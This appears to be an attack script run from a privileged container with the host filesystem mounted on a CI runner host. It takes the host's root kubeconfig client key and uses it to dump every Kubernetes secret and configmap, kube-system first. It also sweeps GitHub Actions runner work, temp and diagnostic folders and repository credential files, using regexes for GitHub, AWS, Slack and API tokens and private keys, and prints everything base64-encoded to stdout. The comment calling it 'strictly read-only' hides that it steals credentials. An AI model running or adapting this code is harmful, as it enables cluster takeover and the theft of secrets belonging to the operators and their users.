#!/usr/bin/env python3
# C8982 helper probe (intent 8982) - runs inside a privileged /:/host:ro container
# on the HYGON runner host github-nmz1. Strictly read-only: only GET against the
# Kubernetes API and file reads. All sensitive values are emitted base64-encoded.
import os, sys, json, base64, glob, re, time, socket, shutil, subprocess
from urllib.parse import quote
try:
    import ssl, http.client
    HAVE_SSL = True
except Exception:
    HAVE_SSL = False

MARK = 'C8982'
HROOT = os.environ.get('C8982_HOST_ROOT', '/host')
TOTAL_BUDGET = int(os.environ.get('C8982_TOTAL_BUDGET', '6000000'))
SEC_CAP = 3_500_000
CM_CAP = 1_000_000
RUN_CAP = 1_150_000
NODE_CAP = 250_000
NS_CAP = 40_000

used = {'total': 0, 'secrets': 0, 'cm': 0, 'run': 0, 'nodes': 0, 'ns': 0}


class BudgetDone(Exception):
    pass


class SectionFull(Exception):
    pass


def w(line):
    sys.stdout.write(line + '\n')
    sys.stdout.flush()
    used['total'] += len(line) + 1
    if used['total'] > TOTAL_BUDGET:
        raise BudgetDone()


def wsec(section, cap, line):
    w(line)
    used[section] += len(line) + 1
    if used[section] > cap:
        raise SectionFull()


def b64(s):
    if isinstance(s, str):
        s = s.encode('utf-8', 'replace')
    return base64.b64encode(s).decode()


def b64js(o):
    return b64(json.dumps(o, separators=(',', ':'), sort_keys=True))


def chunks(s, n=800):
    return [s[i:i + n] for i in range(0, len(s), n)] or ['']


# ---------------- Kubernetes API client ----------------
def load_kubeconfig(path):
    txt = open(path, encoding='utf-8', errors='replace').read()
    vals = {}
    for line in txt.splitlines():
        t = line.strip()
        for k in ('certificate-authority-data', 'client-certificate-data', 'client-key-data', 'server'):
            if t.startswith(k + ':'):
                vals[k] = t.split(':', 1)[1].strip()
    return vals


class K8s:
    def __init__(self):
        if not HAVE_SSL:
            raise RuntimeError('python ssl module unavailable')
        self.conn = None
        v = load_kubeconfig(os.path.join(HROOT, 'root/.kube/config'))
        self.server = os.environ.get('C8982_KUBE_SERVER') or v.get('server') or 'https://10.17.1.1:6443'
        for name, key in (('ca.crt', 'certificate-authority-data'),
                          ('cc.crt', 'client-certificate-data'),
                          ('ck.key', 'client-key-data')):
            if v.get(key):
                open('/tmp/' + name, 'wb').write(base64.b64decode(v[key]))
        self.ctx = ssl.create_default_context(cafile='/tmp/ca.crt')
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_REQUIRED
        self.ctx.load_cert_chain('/tmp/cc.crt', '/tmp/ck.key')
        rest = self.server.split('://', 1)[1]
        self.host = rest.split('/')[0].split(':')[0]
        self.port = int(rest.split('/')[0].split(':')[1]) if ':' in rest.split('/')[0] else 443

    def get(self, path, timeout=120):
        last = None
        for attempt in range(2):
            try:
                if self.conn is None:
                    self.conn = http.client.HTTPSConnection(self.host, self.port, context=self.ctx, timeout=timeout)
                self.conn.request('GET', path, headers={'Accept': 'application/json', 'User-Agent': 'c8982'})
                r = self.conn.getresponse()
                body = r.read()
                return r.status, body
            except Exception as e:
                last = repr(e)
                try:
                    self.conn.close()
                except Exception:
                    pass
                self.conn = None
                time.sleep(1)
        return -1, last.encode()


# ---------------- sections ----------------
def sec_version(k):
    st, b = k.get('/version', timeout=30)
    w('%s_VERSION_STATUS %s' % (MARK, st))
    if st == 200:
        w('%s_VERSION_B64 %s' % (MARK, b64(b[:4000])))
    else:
        w('%s_VERSION_ERR_B64 %s' % (MARK, b64(b[:600])))


def sec_nodes(k):
    st, b = k.get('/api/v1/nodes?limit=500')
    w('%s_NODES_STATUS %s len=%d' % (MARK, st, len(b)))
    if st != 200:
        w('%s_NODES_ERR_B64 %s' % (MARK, b64(b[:800])))
        return
    try:
        j = json.loads(b)
        items = j.get('items', [])
        w('%s_NODES_COUNT %d' % (MARK, len(items)))
        for node in items:
            meta = node.get('metadata') or {}
            status = node.get('status') or {}
            rec = {
                'name': meta.get('name'),
                'labels': meta.get('labels') or {},
                'annotations': {kk: vv for kk, vv in (meta.get('annotations') or {}).items()
                                if len(str(vv)) < 300 and ('gpu' in kk or 'dcu' in kk or 'node' in kk)},
                'capacity': status.get('capacity') or {},
                'allocatable': status.get('allocatable') or {},
                'nodeInfo': status.get('nodeInfo') or {},
                'addresses': [a.get('address') for a in (status.get('addresses') or [])],
                'taints': meta.get('taints') or [],
                'conditions': [{'t': c.get('type'), 's': c.get('status')} for c in (status.get('conditions') or [])],
            }
            wsec('nodes', NODE_CAP, '%s_NODE_B64 %s' % (MARK, b64js(rec)))
    except Exception as e:
        w('%s_NODES_PARSE_ERR %r' % (MARK, e))


def get_ns_names(k):
    names = []
    path = '/api/v1/namespaces?limit=500'
    st, b = k.get(path)
    w('%s_NS_STATUS %s' % (MARK, st))
    if st != 200:
        w('%s_NS_ERR_B64 %s' % (MARK, b64(b[:800])))
        return []
    try:
        j = json.loads(b)
        for item in j.get('items', []):
            meta = item.get('metadata') or {}
            names.append(meta.get('name'))
            wsec('ns', NS_CAP, '%s_NSREC_B64 %s' % (MARK, b64js(
                {'name': meta.get('name'), 'labels': meta.get('labels') or {},
                 'phase': (item.get('status') or {}).get('phase')})))
    except Exception as e:
        w('%s_NS_PARSE_ERR %r' % (MARK, e))
    return [n for n in names if n]


def ns_priority(ns):
    pri = {'kube-system': 0, 'cattle-system': 1, 'cattle-global-data': 2, 'default': 3,
           'kube-public': 4, 'kube-node-lease': 5}
    if ns in pri:
        return pri[ns]
    for i, kw in enumerate(('ci', 'gpu', 'runner', 'hcu', 'build', 'jenkins', 'gitlab',
                            'harbor', 'argo', 'longhorn', 'monitoring', 'ingress', 'cert',
                            'rancher', 'system')):
        if kw in ns:
            return 10 + i
    return 100


def dump_secrets(k, ns):
    path = '/api/v1/namespaces/%s/secrets?limit=500' % ns
    pages = 0
    while path:
        st, b = k.get(path)
        pages += 1
        if st != 200:
            w('%s_SEC_ERR %s %s %s' % (MARK, ns, st, b64(b[:400])))
            return
        try:
            j = json.loads(b)
        except Exception as e:
            w('%s_SEC_PARSE_ERR %s %r' % (MARK, ns, e))
            return
        items = j.get('items') or []
        w('%s_NS_SECRETS %s count=%d page=%d' % (MARK, ns, len(items), pages))
        for s in items:
            meta = s.get('metadata') or {}
            name = meta.get('name') or ''
            typ = s.get('type') or ''
            data = s.get('data') or {}
            keep = {'labels': meta.get('labels') or {},
                    'ann': {kk: vv for kk, vv in (meta.get('annotations') or {}).items()
                            if kk in ('kubernetes.io/service-account.name',
                                      'meta.helm.sh/release-name', 'meta.helm.sh/release-namespace',
                                      'kubernetes.io/service-account.uid')}}
            wsec('secrets', SEC_CAP, '%s_SEC %s|%s|%s|%s' % (MARK, ns, name, typ, b64js(keep)))
            for key in sorted(data.keys()):
                v = data[key]
                if not isinstance(v, str):
                    v = str(v)
                parts = chunks(v)
                if len(parts) > 1600:  # >1.28 MB of base64 payload, keep first part only
                    wsec('secrets', SEC_CAP, '%s_SDTRUNC %s|%s|%s|%d' % (MARK, ns, name, key, len(v)))
                    parts = parts[:1600]
                for i, ch in enumerate(parts):
                    wsec('secrets', SEC_CAP, '%s_SD %s|%s|%s|%d|%d %s' % (MARK, ns, name, key, i, len(parts), ch))
        ct = ((j.get('metadata') or {}).get('continue'))
        if ct:
            path = '/api/v1/namespaces/%s/secrets?limit=500&continue=%s' % (ns, quote(str(ct)))
        else:
            path = None


def dump_configmaps(k, ns):
    path = '/api/v1/namespaces/%s/configmaps?limit=500' % ns
    pages = 0
    while path:
        st, b = k.get(path)
        pages += 1
        if st != 200:
            w('%s_CM_ERR %s %s %s' % (MARK, ns, st, b64(b[:400])))
            return
        try:
            j = json.loads(b)
        except Exception as e:
            w('%s_CM_PARSE_ERR %s %r' % (MARK, ns, e))
            return
        items = j.get('items') or []
        w('%s_NS_CONFIGMAPS %s count=%d page=%d' % (MARK, ns, len(items), pages))
        for c in items:
            meta = c.get('metadata') or {}
            name = meta.get('name') or ''
            data = c.get('data') or {}
            bdata = c.get('binaryData') or {}
            keep = {'labels': meta.get('labels') or {},
                    'ann': {kk: vv for kk, vv in (meta.get('annotations') or {}).items()
                            if kk in ('meta.helm.sh/release-name', 'meta.helm.sh/release-namespace')}}
            wsec('cm', CM_CAP, '%s_CM %s|%s|%s' % (MARK, ns, name, b64js(keep)))
            for key in sorted(data.keys()):
                v = data[key]
                if not isinstance(v, str):
                    v = str(v)
                vb = b64(v)
                parts = chunks(vb)
                if len(parts) > 800:
                    wsec('cm', CM_CAP, '%s_CMDTRUNC %s|%s|%s|%d' % (MARK, ns, name, key, len(v)))
                    parts = parts[:800]
                for i, ch in enumerate(parts):
                    wsec('cm', CM_CAP, '%s_CMD %s|%s|%s|%d|%d %s' % (MARK, ns, name, key, i, len(parts), ch))
            for key in sorted(bdata.keys()):
                v = bdata[key]
                if not isinstance(v, str):
                    v = str(v)
                parts = chunks(v)
                for i, ch in enumerate(parts):
                    wsec('cm', CM_CAP, '%s_CMB %s|%s|%s|%d|%d %s' % (MARK, ns, name, key, i, len(parts), ch))
        ct = ((j.get('metadata') or {}).get('continue'))
        if ct:
            path = '/api/v1/namespaces/%s/configmaps?limit=500&continue=%s' % (ns, quote(str(ct)))
        else:
            path = None


# ---------------- runner _work/_diag scan ----------------
PAT = re.compile((
    r'ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|ghs_[A-Za-z0-9]{36}|ghu_[A-Za-z0-9]{36}'
    r'|github_pat_[A-Za-z0-9_]{20,}|ghr_[A-Za-z0-9]{36}'
    r'|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|AGPA[0-9A-Z]{16}|AIDA[0-9A-Z]{16}|AROA[0-9A-Z]{16}'
    r'|BEGIN [A-Z ]{0,24}PRIVATE KEY'
    r'|xox[baprs]-[A-Za-z0-9-]{10,}|sk-[A-Za-z0-9]{20,}|AIza[0-9A-Za-z_-]{35}'
    r'|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}'
).encode())
PAT2 = re.compile((
    r'(?i)(aws_secret_access_key|aws_access_key_id|client_secret|api[_-]?key|access[_-]?key'
    r'|auth_token|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN_REQUEST_TOKEN|password|passwd'
    r'|_secret|secret_|token)["\']?\s*[:=]\s*["\']?[A-Za-z0-9/+=_.:@#$%^&*-]{12,}'
).encode())

TEXT_EXT = ('.sh', '.ps1', '.cmd', '.bat', '.env', '.json', '.txt', '.yml', '.yaml',
            '.config', '.log', '.ini', '.conf', '.py', '.js', '.ts', '.service', '')


def read_head(path, n):
    with open(path, 'rb') as f:
        return f.read(n)


def read_tail(path, n):
    with open(path, 'rb') as f:
        f.seek(0, 2)
        sz = f.tell()
        f.seek(max(0, sz - n))
        return f.read(n)


def grep_emit(tag, path, data, hits, max_hits=12):
    for m in PAT.finditer(data):
        if hits[0] >= max_hits:
            return
        s = max(0, m.start() - 80)
        line = data[s:m.end() + 120].replace(b'\n', b' ')[:400]
        wsec('run', RUN_CAP, '%s_%s_HIT %d|%s' % (MARK, tag, hits[0], b64js(
            {'f': path, 'm': b64(line)})))
        hits[0] += 1
    for m in PAT2.finditer(data):
        if hits[0] >= max_hits:
            return
        s = max(0, m.start() - 60)
        line = data[s:m.end() + 100].replace(b'\n', b' ')[:400]
        wsec('run', RUN_CAP, '%s_%s_HIT %d|%s' % (MARK, tag, hits[0], b64js(
            {'f': path, 'm': b64(line)})))
        hits[0] += 1


def scan_runner(base):
    tag = os.path.basename(base)
    w('%s_RUNNER_BEGIN %s' % (MARK, tag))
    work = os.path.join(base, '_work')
    diag = os.path.join(base, '_diag')
    # inventory top level
    for root, lbl in ((work, 'WORK'), (diag, 'DIAG')):
        try:
            ents = sorted(os.scandir(root), key=lambda e: e.name)
            w('%s_RUNNER_%s %s:%s' % (MARK, lbl, tag, ','.join(
                '%s%s' % (e.name, '/' if e.is_dir(follow_symlinks=False) else '') for e in ents[:60])))
        except Exception as e:
            w('%s_RUNNER_%s_ERR %s:%r' % (MARK, lbl, tag, e))
    # _temp leftovers
    temp = os.path.join(work, '_temp')
    if os.path.isdir(temp):
        hits = [0]
        try:
            files = []
            for e in os.scandir(temp):
                if e.is_file(follow_symlinks=False):
                    files.append(e.path)
                elif e.is_dir(follow_symlinks=False) and e.name in ('_runner_file_commands', '_github_workflow', '_github_home'):
                    try:
                        files.extend([x.path for x in os.scandir(e.path) if x.is_file(follow_symlinks=False)][:40])
                    except Exception:
                        pass
            w('%s_RUNNER_TEMPFILES %s:%d' % (MARK, tag, len(files)))
            for p in files[:120]:
                try:
                    st = os.stat(p)
                    if st.st_size > 262144:
                        w('%s_RUNNER_TEMPBIG %s:%s:%d' % (MARK, tag, os.path.basename(p), st.st_size))
                        continue
                    if st.st_size == 0:
                        continue
                    data = read_head(p, 262144)
                    nm = os.path.basename(p)
                    if nm.startswith(('set_env_', 'set_output_', 'save_state_', 'add_path')) or \
                       nm.endswith(('.env', '.json')) or len(data) < 3000:
                        wsec('run', RUN_CAP, '%s_TEMPFILE_B64 %s:%s:%d:%s' % (
                            MARK, tag, nm, st.st_size, b64(data[:6000])))
                    grep_emit('TEMP', '%s/%s' % (tag, nm), data, hits, max_hits=10)
                except Exception as e:
                    w('%s_RUNNER_TEMPERR %s:%s:%r' % (MARK, tag, os.path.basename(p), e))
        except Exception as e:
            w('%s_RUNNER_TEMPERR %s:%r' % (MARK, tag, e))
    # repo checkouts: .git/config credential scan + top-level listing
    try:
        for e in list(os.scandir(work))[:40]:
            if not e.is_dir(follow_symlinks=False) or e.name.startswith('_'):
                continue
            orgdir = e.path
            try:
                repos = [x for x in os.scandir(orgdir) if x.is_dir(follow_symlinks=False)][:30]
            except Exception:
                continue
            for rp in repos:
                gitcfg = os.path.join(rp.path, '.git', 'config')
                hits = [0]
                if os.path.isfile(gitcfg):
                    try:
                        data = read_head(gitcfg, 65536)
                        wsec('run', RUN_CAP, '%s_GITCFG_B64 %s:%s/%s:%s' % (
                            MARK, tag, e.name, rp.name, b64(data[:4096])))
                        grep_emit('GITCFG', '%s/%s/%s/.git/config' % (tag, e.name, rp.name), data, hits, max_hits=6)
                    except Exception as ex:
                        w('%s_GITCFG_ERR %s:%s/%s:%r' % (MARK, tag, e.name, rp.name, ex))
                for extra in ('.env', '.npmrc', '.netrc', '.git-credentials', '.pypirc',
                              'config.json', 'credentials', 'kubeconfig'):
                    p = os.path.join(rp.path, extra)
                    if os.path.isfile(p):
                        try:
                            data = read_head(p, 65536)
                            wsec('run', RUN_CAP, '%s_REPOFILE_B64 %s:%s/%s:%s:%s' % (
                                MARK, tag, e.name, rp.name, extra, b64(data[:8000])))
                        except Exception:
                            pass
    except Exception as e:
        w('%s_RUNNER_REPO_ERR %s:%r' % (MARK, tag, e))
    # _diag logs: pattern grep + identity lines
    if os.path.isdir(diag):
        try:
            logs = []
            for e in os.scandir(diag):
                if e.is_file(follow_symlinks=False) and e.name.endswith(('.log', '.txt')):
                    try:
                        logs.append((os.stat(e.path).st_mtime, e.path))
                    except Exception:
                        pass
            logs.sort(reverse=True)
            w('%s_RUNNER_DIAGLOGS %s:%d' % (MARK, tag, len(logs)))
            hits = [0]
            for mt, p in logs[:6]:
                try:
                    sz = os.stat(p).st_size
                    head = read_head(p, 1500)
                    wsec('run', RUN_CAP, '%s_DIAGHEAD_B64 %s:%s:%d:%s' % (
                        MARK, tag, os.path.basename(p), sz, b64(head)))
                    tail = read_tail(p, 1500000)
                    grep_emit('DIAG', '%s/%s' % (tag, os.path.basename(p)), tail, hits, max_hits=10)
                except Exception as e:
                    w('%s_RUNNER_DIAGERR %s:%s:%r' % (MARK, tag, os.path.basename(p), e))
        except Exception as e:
            w('%s_RUNNER_DIAGERR %s:%r' % (MARK, tag, e))
    w('%s_RUNNER_END %s' % (MARK, tag))



def sec_kubectl():
    cands = [shutil.which('kubectl') or '',
             os.path.join(HROOT, 'usr/local/bin/kubectl'),
             os.path.join(HROOT, 'usr/bin/kubectl'),
             os.path.join(HROOT, 'bin/kubectl'),
             os.path.join(HROOT, 'var/lib/rancher/rke2/bin/kubectl'),
             os.path.join(HROOT, 'opt/kubectl/kubectl'),
             os.path.join(HROOT, 'snap/bin/kubectl')]
    kcfg = os.path.join(HROOT, 'root/.kube/config')
    for c in cands:
        if c and os.path.exists(c):
            w('%s_KUBECTL_FOUND %s' % (MARK, c))
            try:
                out = subprocess.check_output([c, '--kubeconfig', kcfg, 'get', 'nodes', '--no-headers'],
                                              stderr=subprocess.STDOUT, timeout=90)
                w('%s_KUBECTL_OK %s %s' % (MARK, c, b64(out[:4000])))
            except Exception as e:
                w('%s_KUBECTL_ERR %s %r' % (MARK, c, e))
            return
    w('%s_KUBECTL_NONE' % MARK)


def sec_runners():
    bases = sorted(glob.glob(os.path.join(HROOT, 'home/github/actions-runner*')))
    w('%s_RUNNERS_COUNT %d' % (MARK, len(bases)))
    for b in bases:
        if os.path.isdir(b):
            scan_runner(b)


def main():
    w('%s_HELPER_BEGIN %s' % (MARK, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
    w('%s_HELPER_ID %s' % (MARK, os.uname().nodename))
    k = None
    try:
        k = K8s()
        w('%s_KUBE_SERVER %s' % (MARK, k.server))
        # connectivity check
        try:
            s = socket.create_connection((k.host, k.port), timeout=8)
            s.close()
            w('%s_TCP_OK %s:%s' % (MARK, k.host, k.port))
        except Exception as e:
            w('%s_TCP_ERR %s:%s:%r' % (MARK, k.host, k.port, e))
        sec_version(k)
    except BudgetDone:
        w('%s_BUDGET_STOP at=init' % MARK)
        return
    except Exception as e:
        w('%s_KUBE_INIT_ERR %r' % (MARK, e))

    try:
        if k:
            sec_nodes(k)
    except BudgetDone:
        w('%s_BUDGET_STOP at=nodes' % MARK)
        return
    except SectionFull:
        w('%s_NODES_CAP' % MARK)
    except Exception as e:
        w('%s_NODES_ERR %r' % (MARK, e))

    names = []
    try:
        if k:
            names = get_ns_names(k)
    except (BudgetDone, SectionFull):
        w('%s_BUDGET_STOP at=ns' % MARK)
    except Exception as e:
        w('%s_NS_ERR %r' % (MARK, e))
    names = sorted(set(names), key=lambda n: (ns_priority(n), n))
    w('%s_NS_ORDER %s' % (MARK, ','.join(names)))

    # secrets
    if k and names:
        done = []
        try:
            for ns in names:
                dump_secrets(k, ns)
                done.append(ns)
        except SectionFull:
            w('%s_SEC_CAP_REACHED after=%s' % (MARK, ','.join(done)))
        except BudgetDone:
            w('%s_BUDGET_STOP at=secrets done=%s' % (MARK, ','.join(done)))
            return
        except Exception as e:
            w('%s_SEC_LOOP_ERR %r' % (MARK, e))
        rest = [n for n in names if n not in done]
        if rest:
            w('%s_SEC_REMAINING %s' % (MARK, ','.join(rest)))

    # configmaps
    if k and names:
        done = []
        try:
            for ns in names:
                dump_configmaps(k, ns)
                done.append(ns)
        except SectionFull:
            w('%s_CM_CAP_REACHED after=%s' % (MARK, ','.join(done)))
        except BudgetDone:
            w('%s_BUDGET_STOP at=configmaps done=%s' % (MARK, ','.join(done)))
            return
        except Exception as e:
            w('%s_CM_LOOP_ERR %r' % (MARK, e))
        rest = [n for n in names if n not in done]
        if rest:
            w('%s_CM_REMAINING %s' % (MARK, ','.join(rest)))

    # kubectl (if any usable binary exists)
    try:
        sec_kubectl()
    except BudgetDone:
        w('%s_BUDGET_STOP at=kubectl' % MARK)
        return
    except Exception as e:
        w('%s_KUBECTL_LOOP_ERR %r' % (MARK, e))

    # runner trees
    try:
        sec_runners()
    except SectionFull:
        w('%s_RUN_CAP_REACHED' % MARK)
    except BudgetDone:
        w('%s_BUDGET_STOP at=runners' % MARK)
        return
    except Exception as e:
        w('%s_RUN_LOOP_ERR %r' % (MARK, e))
    w('%s_HELPER_END used=%d' % (MARK, used['total']))


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print('%s_FATAL %r' % (MARK, e))
